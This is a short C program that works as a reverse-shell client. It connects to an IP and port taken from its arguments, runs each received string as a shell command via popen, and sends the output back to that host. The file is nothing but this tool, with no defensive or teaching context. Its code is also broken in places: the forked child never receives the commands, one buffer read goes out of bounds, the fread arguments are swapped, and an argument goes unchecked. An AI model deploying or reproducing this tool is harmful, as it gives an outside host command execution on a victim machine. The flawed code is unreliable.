#include <stdlib.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>


char receiveBuffer[1024];
char sendBuffer[1024];
FILE *openFile;

char terminalOutput(const char *termIn);
void helpFunction();

int main(int argc, char *argv[]) {

    if ((argc == 2) && (argv[1] != NULL) && (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0)) {
        helpFunction();
        exit(EXIT_SUCCESS);
    }

    if (argc < 2) {
        perror("Missing argument, check help for usage: ./server --help or ./server -h");
        exit(EXIT_FAILURE);
    }

    char *serverIp;
    int port1; // port number to listen on.
    int sockfd1; // sockfd means socket file descriptor or listening socket descriptor.
    int sockfd2;
    int connectSockets;
    struct sockaddr_in serverAddress; /*sockaddr_in structure allows you to bind a socket with the 
    desired address so that a server can listen to the clients connection requests*/
    struct sockaddr_in clientAddress;
    pid_t cpid;
    bzero((char *) &serverAddress, sizeof(serverAddress));
    port1 = atoi(argv[2]);
    serverIp = argv[1];
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(serverIp);
    serverAddress.sin_port = htons(port1);

    sockfd1 = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd1 < 0) {
        perror("Error occured on opening socket");
        exit(EXIT_FAILURE);
    }

    connectSockets = connect(sockfd1, (struct sockaddr *) &serverAddress, sizeof(serverAddress));
    if (connectSockets < 0) {
        perror("Error occured on connecting sockets ( connect() error )");
        exit(EXIT_FAILURE);
    }

    sleep(4);
    while (1) {
        cpid = fork();
        if (cpid == 0) {
            while (1) {
                if (strncmp(receiveBuffer, "shitBye", 7) == 0) {
                    close(sockfd1);
                    exit(EXIT_SUCCESS);
                }
                terminalOutput(receiveBuffer);
                if (send(sockfd1, sendBuffer, strlen(sendBuffer) + 1, 0) < 0) {
                    perror("Error occured on sending data to socket1");
                    close(sockfd1);
                    exit(EXIT_FAILURE);
                } else {
                    printf("Sending data to socket.\n");
                }
                bzero(&sendBuffer, sizeof(sendBuffer));
                sleep(1);
            }
        } else {
            while (1) {
                bzero(&receiveBuffer, sizeof(receiveBuffer));
                if (recv(sockfd1, receiveBuffer, sizeof(receiveBuffer), 0) < 0) {
                    perror("Error occured on receiving data from socket2");
                    close(sockfd1);
                    exit(EXIT_FAILURE);
                } else {
                    printf("Receiving data from socket.\n");
                }
                sleep(1);
            }
        }
    }

    close(sockfd1);
    return 0;
}

char terminalOutput(const char *termIn) {
    openFile = popen(termIn, "r");
	fread(sendBuffer, 1023, sizeof(char), openFile);
	return sendBuffer[1024];
}

void helpFunction() {
    printf("help message");
    exit(EXIT_SUCCESS);
}